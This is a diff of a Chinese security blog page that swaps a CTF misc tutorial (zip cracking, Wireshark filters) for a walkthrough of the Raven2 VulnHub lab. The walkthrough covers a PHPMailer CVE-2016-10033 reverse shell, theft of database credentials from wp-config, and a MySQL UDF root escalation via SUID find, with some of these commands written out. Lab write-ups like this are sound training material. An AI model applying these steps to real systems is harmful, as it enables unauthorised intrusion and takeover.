@@ -4,20 +4,11 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="misc的基本解题思路">
-    <meta name="description" content="misc的四大部分：
-
-文件操作与隐写
-图片隐写术
-压缩文件处理
-流量取证技术
-
-压缩文件处理
-压缩文件分析
-
-
-伪加密
-如果压缩文件是加密的，或文件头正常但解压缩错误，首先尝试文件是否为伪加密。zip文件是否加密是通过识别符来显示的，在每">
+    <meta name="keywords" content="Raven2靶机详解">
+    <meta name="description" content="靶场基本信息
+地址：https://www.vulnhub.com/entry/raven-2,269/
+发布日期：2018年11月9日目标：得到root权限并且找到4个flag
+难度：中级运行：VMware（网络NET或桥接）描述：Rav">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -29,7 +20,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>misc的基本解题思路(二) | 阿浩の博客</title>
+    <title>Raven2靶机详解 | 阿浩の博客</title>
     <link rel="icon" type="image/png" href="/favicon.png">
     
     <style>
@@ -418,12 +409,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/4.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/3.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">misc的基本解题思路(二)</h1>
+                    <h1 class="description center-align post-title">Raven2靶机详解</h1>
                 </div>
             </div>
         </div>
@@ -447,12 +438,16 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/CTF/">
-                                <span class="chip bg-color">CTF</span>
+                            <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">
+                                <span class="chip bg-color">渗透测试</span>
                             </a>
                         
-                            <a href="/tags/misc/">
-                                <span class="chip bg-color">misc</span>
+                            <a href="/tags/vulnhub/">
+                                <span class="chip bg-color">vulnhub</span>
+                            </a>
+                        
+                            <a href="/tags/%E9%9D%B6%E6%9C%BA/">
+                                <span class="chip bg-color">靶机</span>
                             </a>
                         
                     </div>
@@ -463,8 +458,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/CTF/" class="post-category">
-                                CTF
+                            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="post-category">
+                                渗透测试
                             </a>
                         
                     </div>
@@ -476,21 +471,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2023-02-25
+                    2023-10-31
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2023-03-11
+                    2023-10-31
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.6k
+                    1.7k
                 </div>
                 
 
@@ -515,166 +510,221 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p><strong>misc的四大部分：</strong></p>
-<ul class="lvl-0">
-<li class="lvl-2">文件操作与隐写</li>
-<li class="lvl-2">图片隐写术</li>
-<li class="lvl-2">压缩文件处理</li>
-<li class="lvl-2">流量取证技术</li>
-</ul>
-<h2 id="压缩文件处理">压缩文件处理</h2>
-<h3 id="压缩文件分析">压缩文件分析</h3>
-<ol>
-<li class="lvl-3">
-<p><strong>伪加密</strong></p>
-<p>如果压缩文件是加密的，或文件头正常但解压缩错误，首先尝试文件是否为伪加密。zip文件是否加密是通过识别符来显示的，在每个文件的文件目录字段有一位专门标识了文件是否加密，将其设置为00表示</p>
-<p><mark>使用场景：伪加密文件</mark></p>
-<p><code>操作方法：使用winhex打开压缩文件，找到文件头第九第十个字符，将其修改为0000.</code></p>
-<ol>
-<li class="lvl-6">
-<p>使用winhex打开文件搜索16进制504B0102，可以看到每个加密文件头字段</p>
-</li>
-<li class="lvl-6">
-<p>从50开始计算，第九第十个字符为加密字段，将其设置为0000即为可变成无加密状态</p>
-</li>
-<li class="lvl-6">
-<p>RAR文件由于有头部校验，使用伪加密打开文件会出现报错，使用winhex修改标志位后如报错消失且正常解压缩，说明是伪加密。使用winhex打开RAR文件，找到第24个字节，该字节尾数为4表示加密，0表示无加密，将尾数改为0即可破解伪加密。</p>
-</li>
-</ol>
-</li>
-<li class="lvl-3">
-<p><strong>暴力破解</strong></p>
-<p>通常可以使用ARCHPR.exe工具来破解zip文件</p>
-<p><mark>使用场景：Windows下加密过的zip文件</mark></p>
-<ol>
-<li class="lvl-6">
-<p>攻击类型选择暴力破解，在范围位置根据提示选择暴力破解范围选项设置暴力破解包含的类型，开始于和结束于选项具体范围，如果没有定义则全范围暴力破解。</p>
-<p><code>点击打开选择要破解的文件，点击开始进行破解。建议使用1~9位的数字密码，以及系统自带的英文字典作为密码字典</code></p>
-</li>
-<li class="lvl-6">
-<p>攻击类型选择掩码可以进行复杂的暴力破解，比如知道密码前3位是<mark>abc</mark>，后3位为数字，则在攻击类型选择掩码，在掩码处输入<mark>abc???</mark>，暴力范围选项选择所有数字，打开要破解的点击，点击破解。此时==???==的部分会被我们选择的暴力破解范围中字符代替。</p>
-</li>
-</ol>
-</li>
-<li class="lvl-3">
-<p><strong>明文攻击</strong></p>
-<p>明文攻击指知道加密的ZIP中部分文件的明文内容，利用这些内容推测出密钥并解密ZIP文件方法，相比于暴力破解，这种方法在破解密码较为复杂的压缩包时效率更高。</p>
-<p><mark>使用场景：已知加密的ZIP部分文件明文内容</mark></p>
-<p>例：假设一个加密的压缩包中有两个文件readme.txt和flag.txt，其中flag.txt的内容是我们希望知道的内容，而我们拥有readme.txt的明文文件，使用上述两个文件即可进行明文攻击。</p>
-<p><code>操作：</code></p>
-<p><code>1、将readme.txt的明文文件进行压缩，变成readme1.zip</code></p>
-<p><code>2、打开archpr，攻击类型选择明文，明文文件路径选择readme1.zip（即将明文文件不加密压缩后的文件），加密的文件</code></p>
-<p><code>选择要破解的文件，点击开始，破解成功后会获得密码。</code></p>
+                <h2 id="靶场基本信息">靶场基本信息</h2>
+<p>地址：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/raven-2,269/">https://www.vulnhub.com/entry/raven-2,269/</a><br>
+发布日期：2018年11月9日目标：得到root权限并且找到4个flag<br>
+难度：中级运行：VMware（网络NET或桥接）描述：Raven 2 is an intermediate level boot2root VM. There are four flags to capture. After multiple breaches, Raven Security has taken extra steps to harden their web server to prevent hackers from getting in. Can you still breach Raven?</p>
+<h2 id="主机发现">主机发现</h2>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202310312141703.png" alt=""></p>
+<p>使用nmap进行主机发现：</p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202310312141867.png" alt=""></p>
+<h2 id="信息收集">信息收集</h2>
+<p>端口扫描</p>
+<p>简单的端口扫描发现：</p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202310312141990.png" alt=""></p>
+<p>详细的端口扫描：</p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202310312141333.png" alt=""></p>
+<p>访问<a target="_blank" rel="noopener" href="http://192.168.255.186">http://192.168.255.186</a></p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202310312141819.png" alt=""></p>
+<p>进行目录扫描：</p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202310312141161.png" alt=""></p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202310312141640.png" alt=""></p>
+<p>访问<a target="_blank" rel="noopener" href="http://192.168.255.186/vendor/">http://192.168.255.186/vendor/</a></p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202310312142060.png" alt=""></p>
+<p>点击<mark>PATH</mark>：</p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202310312142146.png" alt=""><br>
+获取flag1</p>
+<p>md5解密结果是Raven2Flag1</p>
+<p>点击<mark>README.md</mark>，下载，打开:</p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202310312142835.png" alt=""></p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202310312142645.png" alt=""></p>
+<p>获得信息：PHPMailer</p>
+<p>点击<mark>VERSION</mark>：</p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202310312142894.png" alt=""></p>
+<p>获取版本信息：5.2.16</p>
+<p>去寻找EXP！</p>
+<p>谷歌搜索引擎搜索：PHPMailer 5.2.16 exp</p>
+<p>CVE-2016-10033<br>
+链接地址：<a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/40974">https://www.exploit-db.com/exploits/40974</a></p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202310312142068.png" alt=""></p>
+<p>将exp拷贝出来后，需要根据自己的环境实际情况针对PHPMailer修改参数:<br>
+41行：改下地址：<a target="_blank" rel="noopener" href="http://192.168.255.186/contact.php">http://192.168.255.186/contact.php</a><br>
+42行：后门名称：/backup.php<br>
+44行：改下回弹的IP和端口  192.168.255.129  6666<br>
+47行：改下写入shell的目录：/var/www/html/backup.php</p>
+<p>执行exp<br>
+<code>python3 40974.py</code></p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202310312142112.png" alt=""></p>
 <blockquote>
-<p>使用该方法需要注意两个关键点：</p>
-<p>1、有一个明文文件，压缩后CRC值与加密压缩包中的文件一致。</p>
-<p>2、明文文件的压缩算法需要与加密压缩文件的压缩算法一致。</p>
+<p>如果环境报错按照环境安装：需要安装requests_toolbelt模块，使用命令：pip install requests-toolbelt安装即可，如果没用pip，需要sudo apt-get install python-pip安装即可。</p>
 </blockquote>
-<p><strong>RAR文件格式</strong></p>
-<p><mark>有时候给出的RAR文件的头部各个字块会会故意给错误导致无法识别。</mark></p>
-<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202302020003592.png" alt="RAR文件格式"></p>
-</li>
-</ol>
-<h2 id="流量取证技术">流量取证技术</h2>
-<p>CTF比赛中，<mark>流量包的取证分析</mark>是另一项重要的考察方向。</p>
-<p>通常比赛中会提供一个包含流量数据的PCAP文件，有时候也会需要选手们先进行修复或重构传输文件后，再进行分析。</p>
-<ul class="lvl-0">
-<li class="lvl-2">
-<p>总体把握</p>
-<ul class="lvl-2">
-<li class="lvl-4">协议分级</li>
-<li class="lvl-4">端点统计</li>
-</ul>
-</li>
-<li class="lvl-2">
-<p>过滤筛选</p>
-<ul class="lvl-2">
-<li class="lvl-4">过滤语法</li>
-<li class="lvl-4">Host，Protocol，contains，特征值</li>
-</ul>
-</li>
-<li class="lvl-2">
-<p>发现异常</p>
-<ul class="lvl-2">
-<li class="lvl-4">特殊字符串</li>
-<li class="lvl-4">协议某字符</li>
-<li class="lvl-4">flag位于服务器中</li>
-</ul>
-</li>
-<li class="lvl-2">
-<p>数据提取</p>
-<ul class="lvl-2">
-<li class="lvl-4">字符串取</li>
-<li class="lvl-4">文件提取</li>
-</ul>
-</li>
-</ul>
-<p><mark>总的来说比赛中的流量分析可以概括为以下三个方向：</mark></p>
-<ul class="lvl-0">
-<li class="lvl-2">
-<p>流量包修复</p>
-</li>
-<li class="lvl-2">
-<p>协议分析</p>
-</li>
-<li class="lvl-2">
-<p>数据提取</p>
-</li>
-</ul>
-<h3 id="流量数据包文件分析">流量数据包文件分析</h3>
-<p><strong>WireShark工具的基本使用</strong></p>
-<p>wirkshark的过滤器和过滤规则能够帮助我们迅速定位到要分析的报文。</p>
-<p><mark>常用的过滤命令：</mark></p>
-<ol>
-<li class="lvl-3">
-<p>过滤IP，如源IP或者目标 x.x.x.x</p>
-<p><code>ip.src eq x.x.x.x or ip.dst eq x.x.x.x 或者 ip.addr eq x.x.x.x</code></p>
-</li>
-<li class="lvl-3">
-<p>过滤端口</p>
-<p><code>tcp.port eq 80 or udp.port eq 80</code></p>
-<p><code>tcp.dstport == 80</code>    只显示tcp协议的目标端口为80</p>
-<p><code>tcp.srcport == 80</code>    只显示tcp协议的源端口为80</p>
-<p><code>tcp.port &gt;= 1 and tcp.port &lt;= 80</code></p>
-</li>
-</ol>
-<p><strong>WireShark协议分析技巧：</strong></p>
-<ol>
-<li class="lvl-3">
-<p>查看网络协议：统计 -&gt; 协议分级</p>
-</li>
-<li class="lvl-3">
-<p>根据数据包特征进行筛选</p>
-<p>右键 -&gt; 作为过滤器应用 -&gt; 选中</p>
-<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202303072340671.png" alt=""></p>
-</li>
-<li class="lvl-3">
-<p>WireShark流汇聚</p>
-<p>在关注的http数据包或tcp数据包中选择流汇聚，可以将HTTP流或TCP流汇聚或还原成数据，在弹出的框中可以看到数据内容。</p>
-</li>
-</ol>
+<p>访问<a target="_blank" rel="noopener" href="http://192.168.255.186/contact.php%EF%BC%8C%E6%AD%A4%E6%97%B6%E5%B0%B1%E4%BC%9A%E7%94%9F%E6%88%90%E5%90%8E%E9%97%A8%E6%96%87%E4%BB%B6backup.php">http://192.168.255.186/contact.php，此时就会生成后门文件backup.php</a></p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202310312142798.png" alt=""></p>
+<p>本地开启监听：nc -vlp 6666<br>
+访问：<a target="_blank" rel="noopener" href="http://192.168.255.186/backup.php">http://192.168.255.186/backup.php</a></p>
+<p>获得反弹shell！<br>
+python -c ‘import pty;pty.spawn(“/bin/bash”)’</p>
 <blockquote>
-<p>常见的HTTP流关键内容：</p>
-<ol>
-<li class="lvl-3">HTML中直接包含重要信息</li>
-<li class="lvl-3">上传或下载文件内容，通常包含文件名、hash值等关键信息，常用POST请求上传</li>
-<li class="lvl-3">一句话木马，POST请求，内容包含eval，内容使用base64加密</li>
-</ol>
+<p>这种方式我尝试过，但就是反弹不回来shell，甚至说后门文件back.php都没有创建成功。</p>
 </blockquote>
-<p><strong>WireShark数据提取</strong></p>
+<p>下面使用别的办法就getshell</p>
+<p>访问<a target="_blank" rel="noopener" href="http://192.168.255.186/wordpress/">http://192.168.255.186/wordpress/</a></p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202310312142300.png" alt=""></p>
+<p>会跳转到wordpress的一个站点，它是跳转<a target="_blank" rel="noopener" href="http://raven.local">http://raven.local</a></p>
+<p>修改本地<mark>hosts</mark>文件：</p>
+<p>命令：<code>sudo vim /etc/hosts</code></p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202310312143793.png" alt=""></p>
+<p><strong>目录枚举：</strong></p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202310312143517.png" alt=""></p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202310312143653.png" alt=""></p>
+<p>使用<mark>dirsearch</mark>对<a target="_blank" rel="noopener" href="http://raven.local/wordpress/%E8%BF%9B%E8%A1%8C%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F%EF%BC%9A">http://raven.local/wordpress/进行目录扫描：</a></p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202310312143450.png" alt=""></p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202310312143478.png" alt=""></p>
+<p>访问<a target="_blank" rel="noopener" href="http://raven.local/wordpress/wp-content/uploads/">http://raven.local/wordpress/wp-content/uploads/</a></p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202310312143506.png" alt=""></p>
+<p>一直点击下去会发现有<mark>flag3.png</mark></p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202310312143037.png" alt=""></p>
+<p>md5解密后得到：Raven2Flag3</p>
+<blockquote>
+<p>到这里可以猜到flag2就是md5(Raven2Flag2)，flag4就是md5(Raven2Flag4)</p>
+</blockquote>
+<p>访问<a target="_blank" rel="noopener" href="http://raven.local/manual/">http://raven.local/manual/</a></p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202310312143754.png" alt=""></p>
+<p>发现Apache版本信息：</p>
+<p><mark>Apache HTTP Server Version 2.4 Documentation</mark></p>
+<h2 id="漏洞发现">漏洞发现</h2>
+<p>网上搜索获取的针对这个靶机环境的两种漏洞利用方式：</p>
+<p>一、metasploit</p>
 <ol>
 <li class="lvl-3">
-<p>使用WireShark可以自动提取通过http传输的文件内容</p>
-<p><mark>文件 -&gt; 导出对象 -&gt; HTTP</mark></p>
-<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202303111906811.png" alt=""></p>
+<p>先配置信息，具体信息如下<br>
+set RHOSTS 192.168.31.43<br>
+set TARGETURI /contact.php<br>
+set WEB_ROOT /var/www/html</p>
 </li>
 <li class="lvl-3">
-<p>WireShark可以手动提取文件内容</p>
-<p>点击想要的数据包，选定内容 的位置，右键 -&gt; 导出分组字节流，或者点击菜单栏 文件 -&gt; 导出分组字节流，快捷方式Ctrl + H，在弹出的框中将文件保存成二进制文件。</p>
+<p>run，运行运行后会在/var/www/html/路径写入一个xxx.php文件，文件内容的作用是反弹shell，文件名是随机的</p>
+</li>
+<li class="lvl-3">
+<p>把文件名复制到浏览器进行访问<br>
+<a target="_blank" rel="noopener" href="http://raven.local/xxx.php">http://raven.local/xxx.php</a></p>
+</li>
+<li class="lvl-3">
+<p>等待几分钟就能得到shell，www权限。注：【我的电脑操作可以，但是我不确定是否所有人都可以】如果觉得等待时间长可以按Ctrl+C停止等待，使用sessions查看会话可以看到已经生成的sessions，使用sessions 1进入。</p>
 </li>
 </ol>
+<p>二、exploit POC</p>
+<ol>
+<li class="lvl-3">
+<p>使用漏洞POC需要先修改POC脚本中的配置信息，和metasploit差不多把url换成<a target="_blank" rel="noopener" href="http://raven.local/contact.php">http://raven.local/contact.php</a><br>
+把反弹shell语句中的ip改为自己kali系统的ip，端口8888<br>
+把写入后门的路径修改为/var/www/html<br>
+写入后门文件的文件名字母数字组合随便写</p>
+</li>
+<li class="lvl-3">
+<p>监听本地端口<br>
+nc -lvp 8888</p>
+</li>
+<li class="lvl-3">
+<p>运行POC脚本后会在/var/www/html/路径写入一个xxx.php文件，文件内容的作用是反弹shell，文件名是自己定义（或默认）的。</p>
+</li>
+<li class="lvl-3">
+<p>访问这个xxx.php文件,使得此文件运行，从而反弹shell到本地。<br>
+<a target="_blank" rel="noopener" href="http://raven.local/xxx.php">http://raven.local/xxx.php</a></p>
+</li>
+</ol>
+<h2 id="漏洞利用">漏洞利用</h2>
+<p>利用MSF进行getshell：</p>
+<p><code>search PHPMailer</code></p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202310312143991.png" alt=""></p>
+<p>发现第0个适用（适用于5.2.19及以下版本phpmailer）</p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202310312143722.png" alt=""></p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202310312144429.png" alt=""></p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202310312144062.png" alt=""></p>
+<p>获得反弹shell：</p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202310312144605.png" alt=""></p>
+<p>命令：<code>python -c 'import pty; pty.spawn("/bin/bash")'</code>，获得伪终端后</p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202310312144396.png" alt=""></p>
+<p>使用find查找flag文件</p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202310312144743.png" alt=""></p>
+<p>这个flag之前已经拿到了</p>
+<p>继续进行信息搜集</p>
+<p>我们之前进行目录枚举的是扫描出<mark>wordpress</mark>目录下有个==wp-config.php：</p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202310312144644.png" alt=""></p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202310312144208.png" alt=""></p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202310312144344.png" alt=""></p>
+<p>发现数据库账户密码</p>
+<p>进行数据库连接，连接成功后查看有哪些数据库：</p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202310312144917.png" alt=""></p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202310312144937.png" alt=""></p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202310312144684.png" alt=""></p>
+<p>获取用户名及密码（加密）</p>
+<p><strong>查看mysql权限：</strong></p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202310312144408.png" alt=""></p>
+<p>MySQL以root的身份运行，可以通过mysql提权</p>
+<p>查看历史安装包版本：</p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202310312144565.png" alt=""></p>
+<h2 id="权限提升">权限提升</h2>
+<p>因为mysql版本&gt;=5.1，所以必须把 UDF 的动态链接库.so文件放置于 MySQL 安装目录下的 lib\plugin 文件夹下文件夹下才能创建自定义函数。</p>
+<p><strong>查看插件所在路径：</strong></p>
+<p>首先看一下是否满足写入条件：</p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202310312145933.png" alt=""></p>
 <blockquote>
-<p>免责声明：本文章涉及的知识和技能仅用于学习研究，如有用于非法途径或未被授权的真实网络环境，所造成的后果自行承担，责任与本文作者无关，倡导把安全知识和技能用于正当、正规、正义的途径。</p>
+<p>1）当 secure_file_priv 的值为 NULL ，表示限制 mysqld 不允许导入|导出，此时无法提权<br>
+2）当 secure_file_priv 的值为 /tmp/ ，表示限制 mysqld 的导入|导出只能发生在 /tmp/目录下，此时也无法提权<br>
+3）当 secure_file_priv 的值没有具体值时，表示不对 mysqld 的导入|导出做限制，此时可提权!<br>
+如果是 MySQL &gt;= 5.1 的版本，必须把 UDF 的动态链接库文件放置于 MySQL 安装目录下的 lib\plugin 文件夹下文件夹下才能创建自定义函数</p>
+</blockquote>
+<p>查看插件目录：</p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202310312145339.png" alt=""></p>
+<p>查看能否远程登陆：</p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202310312145443.png" alt=""></p>
+<p>发现这里root用户不允许远程登陆，因此不能利用MSF提权。</p>
+<p>谷歌搜索引擎搜索：mysql 5.x UDF exploit  或者  searchsploit udf<br>
+exp链接：<a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/1518">https://www.exploit-db.com/exploits/1518</a></p>
+<p>insert into exp values(load_file(‘/tmp/exp.so’));</p>
+<p>select * from exp into dumpfile ‘/usr/lib/mysql/plugin/exp.so’;</p>
+<p>create function do_system returns integer soname ‘<a target="_blank" rel="noopener" href="http://exp.so">exp.so</a>’;</p>
+<p>find exp -exec “/bin/sh” ;</p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202310312145918.png" alt=""></p>
+<p>GCC编译.o文件：</p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202310312145244.png" alt=""></p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202310312145755.png" alt=""></p>
+<blockquote>
+<p>命令参数解析：</p>
+<p>-g 生成调试信息<br>
+-c 编译（二进制）<br>
+-shared：创建一个动态链接库，输入文件可以是源文件、汇编文件或者目标文件。<br>
+-o：执行命令后的文件名<br>
+-lc：-l 库 c库名</p>
+</blockquote>
+<p>本地使用python开启http服务：</p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202310312145748.png" alt=""></p>
+<p>在靶机的<mark>tmp</mark>目录下载刚才编译好的文件</p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202310312145324.png" alt=""></p>
+<p>进入数据库创建数据表exp：</p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202310312145021.png" alt=""></p>
+<p>插入数据文件：</p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202310312145007.png" alt=""></p>
+<p>exp表成功插入二进制数据，然后利用dumpfile函数把文件导出，outfile 多行导出，dumpfile一行导出<br>
+outfile会有特殊的转换，而dumpfile是原数据导出！</p>
+<p>新建存储函数：</p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202310312145666.png" alt=""></p>
+<p>创建自定义函数do_system，类型是integer，别名（soname）文件名字，然后查询函数是否创建成功：</p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202310312145234.png" alt=""></p>
+<p>查看以下创建的函数：</p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202310312145698.png" alt=""></p>
+<p>调用do_system函数来给find命令所有者的suid权限，使其可以执行root命令：</p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202310312145274.png" alt=""></p>
+<p>执行find命令，使用find执行 shell：</p>
+<p><code>touch exp</code><br>
+<code>find exp -exec "/bin/sh" \;</code><br>
+或者：<code>find exp -exec "id" \;</code></p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202310312145217.png" alt=""></p>
+<p>读取<mark>root</mark>目录下的flag4.txt文件：</p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202310312146931.png" alt=""></p>
+<blockquote>
+<p>免责声明：本文章涉及的知识和技能仅用于学习研究，如有用于非法途径或未被授权的真实网络环境，所造成的后果及连带责任自行承担，与本文作者无关，倡导把安全知识和技能用于正当、正规、正义的途径。</p>
 </blockquote>
 
                 
@@ -702,7 +752,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://www.ahao8.top/posts/e560.html">https://www.ahao8.top/posts/e560.html</a>
+                    <a href="https://www.ahao8.top/posts/41f7.html">https://www.ahao8.top/posts/41f7.html</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -740,12 +790,16 @@
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/CTF/">
-                                    <span class="chip bg-color">CTF</span>
+                                <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">
+                                    <span class="chip bg-color">渗透测试</span>
                                 </a>
                             
-                                <a href="/tags/misc/">
-                                    <span class="chip bg-color">misc</span>
+                                <a href="/tags/vulnhub/">
+                                    <span class="chip bg-color">vulnhub</span>
+                                </a>
+                            
+                                <a href="/tags/%E9%9D%B6%E6%9C%BA/">
+                                    <span class="chip bg-color">靶机</span>
                                 </a>
                             
                         </div>
@@ -1071,16 +1125,18 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/posts/8b0b.html">
+                <a href="/posts/41f7.html">
                     <div class="card-image">
                         
-                        <img src="/medias/loading.gif" data-original="/medias/featureimages/24.jpg" class="responsive-img" alt="Linux服务器基础知识">
                         
-                        <span class="card-title">Linux服务器基础知识</span>
+                        <img src="/medias/loading.gif" data-original="/medias/featureimages/3.jpg" class="responsive-img" alt="Raven2靶机详解">
+                        
+                        <span class="card-title">Raven2靶机详解</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -1090,30 +1146,35 @@
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2023-03-15
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-10-31
+                            </span>
